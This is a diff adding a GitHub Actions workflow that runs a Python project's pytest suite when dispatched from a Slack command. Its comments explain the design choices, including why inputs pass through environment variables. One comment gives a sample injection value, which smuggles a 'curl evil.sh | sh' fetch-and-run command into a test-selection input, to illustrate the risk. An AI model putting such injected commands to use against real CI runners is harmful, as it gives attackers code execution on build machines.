@@ -1,0 +1,126 @@
+# runtests-python.yml — V1. COPY THIS INTO A PYTHON PROJECT, at
+# .github/workflows/runtests-python.yml.
+#
+# V1 vs V2, and this is the load-bearing difference
+# ------------------------------------------------
+# stonedog-testrunner's OWN .github/workflows/runtests.yml is V2: it parks work
+# for an enrolled self-hosted runner that picks it up by polling, so it declares
+#
+#     runs-on: [self-hosted, linux, testlab]
+#
+# V1 is the opposite — the edge dispatches this and waits for it to finish — so
+# it runs on `ubuntu-latest` and actually executes the suite. Copying the V2
+# file into a product repo produces a workflow that QUEUES FOREVER against a
+# runner label nothing answers to, and the symptom is a job that never starts
+# rather than one that fails. Do not overwrite that file with this one.
+#
+# Why a separate file per language rather than one taking a `language` input:
+# `workflow_dispatch` accepts at most TEN inputs and the edge already sends
+# EIGHT, and one workflow serving both needs an `if:` around every setup, cache
+# and install step. The choice is made at the edge instead — see
+# `slack_runtests.store.base.DEFAULT_WORKFLOW`, which maps `python` to this
+# filename. RENAMING THIS FILE BREAKS DISPATCH.
+
+name: runtests-python
+run-name: runtests ${{ inputs.product }} @ ${{ inputs.server }} (${{ inputs.correlation_id }})
+
+on:
+  workflow_dispatch:
+    inputs:
+      # EVERY input the edge sends must be declared, including the ones this
+      # workflow ignores. An undeclared input is a 422 from GitHub, and a 422
+      # reads as "GitHub is broken" rather than "this workflow is one line out
+      # of date" — already learned once, in NEH-1152.
+      #
+      # The list is `slack_runtests.runners.github.dispatch_workflow`'s
+      # `inputs` dict, and tests/unit/test_workflow_templates.py asserts these
+      # two agree rather than trusting this comment.
+      correlation_id: { required: true,  type: string }
+      product:        { required: true,  type: string }
+      server:         { required: true,  type: string }
+      test_scope:     { required: false, type: string }
+      select:         { required: false, type: string }
+      marker:         { required: false, type: string }
+      slack_channel:  { required: true,  type: string }
+      slack_user:     { required: true,  type: string }
+
+# A slash command is a free trigger for an expensive job. Cap it.
+concurrency:
+  group: runtests-${{ inputs.product }}-${{ inputs.server }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    env:
+      # ─────────────────────────────────────────────────────────────────────
+      # THIS BLOCK IS A SECURITY CONTROL, NOT TIDINESS.
+      #
+      # GitHub substitutes ${{ ... }} into the script TEXTUALLY, before any
+      # shell sees it. Interpolating an input directly into a `run:` block:
+      #
+      #     run: pytest -k ${{ inputs.select }}
+      #
+      # with a value of:  smoke"; curl evil.sh | sh; "
+      # is arbitrary code execution on the runner.
+      #
+      # Routing through env: means the value arrives as data the shell already
+      # holds, and is never parsed as script. The regex in parsing.py is the
+      # second lock on the same door; keep both.
+      # ─────────────────────────────────────────────────────────────────────
+      PRODUCT: ${{ inputs.product }}
+      SERVER: ${{ inputs.server }}
+      SELECT: ${{ inputs.select }}
+      MARKER: ${{ inputs.marker }}
+      TEST_SCOPE: ${{ inputs.test_scope }}
+      CORRELATION_ID: ${{ inputs.correlation_id }}
+      SLACK_CHANNEL: ${{ inputs.slack_channel }}
+      SLACK_USER: ${{ inputs.slack_user }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # PIN THE MAJOR AND CHECK IT EXISTS. A nonexistent tag on a setup action
+      # fails in "Set up job", before any step of yours runs, and reads exactly
+      # like a runner outage — `astral-sh/setup-uv@v10` killed three gates in
+      # this fleet that way.
+      - name: Install uv
+        uses: astral-sh/setup-uv@v5
+
+      # `--frozen`, never a bare sync: the lockfile is the thing under test as
+      # much as the suite is, and a resolving sync would silently install
+      # something no lockfile ever agreed to.
+      - run: uv sync --frozen
+
+      # A run whose result nobody can find is a run that did not happen. This
+      # is the ONLY place that knows the run id — `workflow_dispatch` answers
+      # 204 with no id, so the edge could never tell the user where their run
+      # went.
+      - name: Announce the run
+        run: |
+          echo "runtests: $PRODUCT on $SERVER (scope ${TEST_SCOPE:-<none>}), id $CORRELATION_ID"
+          echo "  $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+
+      # The `${VAR:+...}` form omits the flag entirely when the value is empty,
+      # rather than passing an empty expression — which pytest reads as
+      # "deselect everything" and would report a green over zero tests.
+      - name: Run the suite
+        run: |
+          uv run pytest \
+            ${SELECT:+-k "$SELECT"} \
+            ${MARKER:+-m "$MARKER"} \
+            --junit-xml=results.xml
+
+      # `if: always()` so a FAILING run still uploads its report. A report that
+      # exists only for passing runs is a report nobody needs.
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: results-${{ inputs.correlation_id }}
+          path: results.xml
+          if-no-files-found: ignore
